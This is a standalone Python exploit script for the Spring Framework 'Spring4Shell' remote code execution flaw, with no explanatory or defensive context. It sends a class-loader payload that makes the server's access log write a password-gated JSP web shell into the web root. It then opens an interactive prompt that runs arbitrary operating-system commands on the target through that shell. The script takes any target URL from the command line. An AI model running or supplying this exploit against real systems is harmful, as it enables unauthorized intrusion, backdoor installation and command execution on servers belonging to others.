# Spring Framework RCE (before 5.2) "Spring4Shell" 

import sys
import requests
import urllib3
import urllib
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

urllib3.util.url._QUERY_CHARS.add('%')
urllib3.util.url._QUERY_CHARS.add('|')
urllib3.util.url._QUERY_CHARS.add(':')

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

FILENAME = "cmdinjection"
PASSWORD = 'abb#L09hBux7'
DIRECTORY = 'ROOT'

##########################################################
#   FUNCTIONS
##########################################################

def exploit(s, url, filename, password, directory):
    headers = {"suffix":"%><!--//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"
    }
    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{password}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/{directory}&class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:
        s.post(url,headers=headers, data=data, timeout=15)
        shellurl = urllib.parse.urljoin(url, f"{filename}.jsp")
        shellgo = s.get(shellurl, timeout=15)
        if shellgo.status_code == 200:
            print(f"[+] Shell Uploaded Successfully!\nYour shell can be found at: {shellurl}?pwd={password}&cmd=whoami")
            success = True
            while success:
                command = input('> ')
                cmd = urllib.parse.quote(command)
                passw = urllib.parse.quote(password)
                r = s.get(f'{shellurl}?pwd={passw}&cmd={cmd}', timeout=15)
                if r.status_code == 200:
                    print(r.text.split('<!--//')[0])
                else:
                    success = False

        else:
            print("[-] Exploit failed to upload")
    except Exception as e:
        print(e)
        pass

def show_usage():
    print('[+] Usage: %s <TARGET_URL>' % sys.argv[0])
    print('[+] Example: %s http://www.target.com' % sys.argv[0])
    sys.exit(-1)

##########################################################
#   MAIN
##########################################################

def main():
    print('[+] Spring Framework RCE (before 5.2) "Spring4Shell"\n')
    try:
        url = sys.argv[1].strip()
    except IndexError:
        show_usage()
    s = requests.Session()
    s.proxies = proxies     # Comment this line to disable proxying
    s.verify = False
    try:
        r = s.get(url, allow_redirects=False)
        time.sleep(1)
        if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
            print('\n[-] HOST seems to be down <!>')
            sys.exit(-1)
        else:
            time.sleep(1)
            parsed_url = urllib.parse.urlparse(url)
            host = parsed_url.netloc
            if parsed_url.port:
                port = parsed_url.port
            elif parsed_url.scheme == "https":
                port = 443
            elif parsed_url.scheme == "http":
                port = 80
            url = parsed_url.scheme + '://' + host
            time.sleep(2)
            exploit(s, url, FILENAME, PASSWORD, DIRECTORY)

    except requests.exceptions.ProxyError:
        print('[-] PROXY seems to be missconfigured <!>')
        print('[-] Set up proxy on localhost:8080 <!>')
        print('[-] Or comment line 59 "s.proxies = proxies" <!>')
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()
